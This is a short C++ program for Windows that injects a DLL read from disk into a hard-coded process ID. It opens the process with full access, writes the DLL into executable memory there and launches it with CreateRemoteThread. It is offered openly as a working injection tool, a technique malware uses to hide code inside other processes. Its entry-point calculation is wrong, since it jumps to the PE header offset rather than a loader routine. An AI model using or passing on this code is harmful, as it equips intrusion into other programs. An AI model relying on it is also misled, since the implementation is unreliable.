#include <Windows.h>
#include <stdio.h>

typedef BOOL(WINAPI* ReflectiveDllMain)(HINSTANCE, DWORD, LPVOID);

BOOL ReflectiveDLLInjection(DWORD dwProcessId, BYTE* pDllBuffer, DWORD dwDllSize)
{
    HANDLE hProcess, hThread;
    LPVOID pRemoteDll = NULL;
    ReflectiveDllMain pReflectiveDllMain = NULL;
    DWORD threadId = 0;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        printf("Failed to open the target process.\n");
        return FALSE;
    }

    pRemoteDll = VirtualAllocEx(hProcess, NULL, dwDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteDll == NULL)
    {
        printf("Failed to allocate memory in the target process.\n");
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteDll, pDllBuffer, dwDllSize, NULL))
    {
        printf("Failed to write the DLL to the target process memory.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    pReflectiveDllMain = (ReflectiveDllMain)((PBYTE)pRemoteDll + ((PIMAGE_DOS_HEADER)pRemoteDll)->e_lfanew);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pReflectiveDllMain, pRemoteDll, 0, &threadId);
    if (hThread == NULL)
    {
        printf("Failed to create a remote thread in the target process.\n");
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    DWORD exitCode;
    if (!GetExitCodeThread(hThread, &exitCode) || exitCode == 0)
    {
        printf("Failed to execute the reflective DLL injection in the target process.\n");
        CloseHandle(hThread);
        VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    printf("DLL injected and executed successfully.\n");

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteDll, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}

int main()
{
    FILE* file = fopen("mydll.dll", "rb");
    if (file == NULL)
    {
        printf("Failed to open the DLL file.\n");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long fileSize = ftell(file);
    rewind(file);

    BYTE* pDllBuffer = new BYTE[fileSize];
    fread(pDllBuffer, 1, fileSize, file);
    fclose(file);

    DWORD dwTargetProcessId = 13084;

    if (!ReflectiveDLLInjection(dwTargetProcessId, pDllBuffer, fileSize))
    {
        printf("Failed to perform reflective DLL injection.\n");
        delete[] pDllBuffer;
        return 1;
    }

    delete[] pDllBuffer;

    return 0;
}
